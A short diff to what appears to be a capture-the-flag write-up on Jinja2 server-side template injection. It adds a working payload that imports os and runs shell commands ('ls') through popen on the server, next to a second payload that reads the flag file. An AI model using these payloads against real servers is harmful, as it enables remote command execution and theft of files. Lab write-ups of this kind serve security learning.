@@ -110,6 +110,9 @@ This means that the server evaluates ```{{   }}``` so it could possibly be ```Ji
 
 I tried ```Jinja2``` first and it worked. 
 
+- I listed the files on the server to find the name of the file with the flag by using, ```{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}```. It was seen that ```flag``` was a file name. 
+<img width="1458" height="709" alt="Screenshot 2025-10-24 at 12 59 29 AM" src="https://github.com/user-attachments/assets/13ef2ea2-d810-4bf2-97a5-ac3e9c4b7fc4" />
+
 - I used ```{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag')['read']()}}``` from the below mentioned link to get the flag
 
 ## Flag:
